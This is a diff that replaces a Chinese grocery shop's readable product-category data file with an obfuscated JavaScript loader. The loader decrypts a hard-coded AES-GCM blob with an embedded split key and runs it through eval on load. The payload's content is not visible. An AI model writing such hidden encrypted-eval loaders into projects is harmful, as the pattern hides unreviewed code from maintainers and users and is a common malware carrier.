@@ -1,112 +1,25 @@
-// ============================================
-// 商品数据文件
-// 以后加商品、改价格、改库存，都只改这个文件
-// ============================================
-
-
-const TOP_CATEGORIES = [
-  { id: 8, name: '餐吧', icon: '🍴' },
-  { id: 1, name: '肉蛋果蔬', icon: '🥬' },
-  { id: 2, name: '乳品烘焙', icon: '🧁' },
-  { id: 3, name: '速食冷冻', icon: '🍱' },
-  { id: 4, name: '休闲零食', icon: '🍿' },
-  { id: 5, name: '酒水饮料', icon: '🧃' },
-  { id: 6, name: '粮油干货', icon: '🌾' },
-  { id: 7, name: '个护美妆', icon: '💄' },
-  { id: 9, name: '母婴玩具', icon: '🍼' },
-];
-
-const SUB_CATEGORIES = [
-  { id: 801, parentId: 8, name: '全部' },
-  { id: 802, parentId: 8, name: '热熟食' },
-  { id: 803, parentId: 8, name: '轻食' },
-  { id: 804, parentId: 8, name: '甜点' },
-  { id: 101, parentId: 1, name: '全部' },
-  { id: 102, parentId: 1, name: '水果' },
-  { id: 103, parentId: 1, name: '精选蔬菜' },
-  { id: 104, parentId: 1, name: '有机蔬菜' },
-  { id: 105, parentId: 1, name: '牛肉' },
-  { id: 106, parentId: 1, name: '牛排' },
-  { id: 107, parentId: 1, name: '海鲜水产' },
-  { id: 108, parentId: 1, name: '猪肉' },
-  { id: 109, parentId: 1, name: '禽类/蛋' },
-  { id: 110, parentId: 1, name: '羊肉' },
-  { id: 111, parentId: 1, name: '豆制品' },
-  { id: 112, parentId: 1, name: '速冻果蔬' },
-  { id: 201, parentId: 2, name: '全部' },
-  { id: 202, parentId: 2, name: '面包/点心' },
-  { id: 203, parentId: 2, name: '蛋糕' },
-  { id: 204, parentId: 2, name: '鲜奶/鲜咖' },
-  { id: 205, parentId: 2, name: '常温牛奶' },
-  { id: 206, parentId: 2, name: '酸奶/乳酸菌' },
-  { id: 207, parentId: 2, name: '冷藏饮品' },
-  { id: 208, parentId: 2, name: '常温果汁' },
-  { id: 209, parentId: 2, name: '谷物冲调' },
-  { id: 210, parentId: 2, name: '黄油/奶酪' },
-  { id: 211, parentId: 2, name: '咖啡/茶' },
-  { id: 301, parentId: 3, name: '全部' },
-  { id: 302, parentId: 3, name: '快手菜' },
-  { id: 303, parentId: 3, name: '速食肉制品' },
-  { id: 304, parentId: 3, name: '香肠/火腿' },
-  { id: 305, parentId: 3, name: '熟食' },
-  { id: 306, parentId: 3, name: '佐餐速食' },
-  { id: 307, parentId: 3, name: '冰淇淋/甜品' },
-  { id: 308, parentId: 3, name: '冷冻面点' },
-  { id: 309, parentId: 3, name: '火锅丸滑' },
-  { id: 310, parentId: 3, name: '冷冻果蔬' },
-  { id: 311, parentId: 3, name: '冷冻肉禽' },
-  { id: 312, parentId: 3, name: '冷冻水产' },
-  { id: 401, parentId: 4, name: '全部' },
-  { id: 402, parentId: 4, name: '低糖/低Gl' },
-  { id: 403, parentId: 4, name: '月饼/礼盒' },
-  { id: 404, parentId: 4, name: '坚果蜜钱' },
-  { id: 405, parentId: 4, name: '肉干海苔' },
-  { id: 406, parentId: 4, name: '饼干曲奇' },
-  { id: 407, parentId: 4, name: '糕点零食' },
-  { id: 408, parentId: 4, name: '薯片膨化' },
-  { id: 409, parentId: 4, name: '巧克力' },
-  { id: 410, parentId: 4, name: '糖果/果冻' },
-  { id: 411, parentId: 4, name: '方便食品' },
-  { id: 412, parentId: 4, name: '即食甜品' },
-  { id: 501, parentId: 5, name: '全部' },
-  { id: 502, parentId: 5, name: '啤酒' },
-  { id: 503, parentId: 5, name: '果酒/预调' },
-  { id: 504, parentId: 5, name: '清酒' },
-  { id: 505, parentId: 5, name: '果汁/植物饮' },
-  { id: 506, parentId: 5, name: '咖啡/茶饮' },
-  { id: 507, parentId: 5, name: '饮用水' },
-  { id: 508, parentId: 5, name: '碳酸饮料' },
-  { id: 601, parentId: 6, name: '全部' },
-  { id: 602, parentId: 6, name: '一酱成菜' },
-  { id: 603, parentId: 6, name: '大米面粉' },
-  { id: 604, parentId: 6, name: '五谷杂粮' },
-  { id: 605, parentId: 6, name: '食用油' },
-  { id: 606, parentId: 6, name: '南北干货' },
-  { id: 607, parentId: 6, name: '燕窝滋补' },
-  { id: 608, parentId: 6, name: '罐头/酱菜' },
-  { id: 609, parentId: 6, name: '调味酱汁' },
-  { id: 610, parentId: 6, name: '酱油/醋' },
-  { id: 611, parentId: 6, name: '盐糖调料' },
-  { id: 701, parentId: 7, name: '全部' },
-  { id: 702, parentId: 7, name: '秋冬润护' },
-  { id: 703, parentId: 7, name: '面部护理' },
-  { id: 704, parentId: 7, name: '洗发护发' },
-  { id: 705, parentId: 7, name: '身体护理' },
-  { id: 706, parentId: 7, name: '口腔健康' },
-  { id: 707, parentId: 7, name: '个人清洁' },
-  { id: 708, parentId: 7, name: '女性护理' },
-  { id: 709, parentId: 7, name: '儿童/男士' },
-  { id: 710, parentId: 7, name: '彩妆/香氛' },
-  { id: 901, parentId: 9, name: '婴幼儿配方乳粉' },
-  { id: 902, parentId: 9, name: '四段/儿童奶粉' },
-  { id: 903, parentId: 9, name: '特医食品' },
-  { id: 904, parentId: 9, name: '尿裤，湿巾' },
-  { id: 905, parentId: 9, name: '玩具乐园' },
-  { id: 906, parentId: 9, name: '宝宝零食' },
-  { id: 907, parentId: 9, name: '辅食/调味品' },
-  
-
-  
-];let PRODUCTS = [];
-const LOADED_CATS = {};
-
+(function(){
+var _w=(typeof window!=='undefined')?window:globalThis;
+if(!_w.__decryptWaiters){_w.__decryptWaiters={};}
+if(!_w.__decryptDone){_w.__decryptDone=function(k){
+  if(_w.__decryptWaiters[k]){_w.__decryptWaiters[k].forEach(function(cb){cb();});delete _w.__decryptWaiters[k];}
+  else{_w.__decryptWaiters[k]='done';}
+};}
+var _a='RGFnZW5pU2',_b='hvcDIwMjZTZW',_c='NyZXRLZXkwMTIzNDU2Nzg=';
+var _i='E5fe9x3DZ4OXpWQ6';
+var _x='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',_y='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';
+(async function(){
+try{
+var _k=new TextEncoder().encode(atob(_a+_b+_c));
+var _iv=Uint8Array.from(atob(_i),function(c){return c.charCodeAt(0)});
+var _d=Uint8Array.from(atob(_x+_y),function(c){return c.charCodeAt(0)});
+var _key=await _w.crypto.subtle.importKey('raw',_k,{name:'AES-GCM'},false,['decrypt']);
+var _pt=await _w.crypto.subtle.decrypt({name:'AES-GCM',iv:_iv,tagLength:128},_key,_d);
+var _txt=new TextDecoder().decode(_pt);
+(0,eval)(_txt);
+_w.__decryptDone('products.js');
+}catch(e){
+_w.__decryptDone('products.js');
+}
+})();
+})();
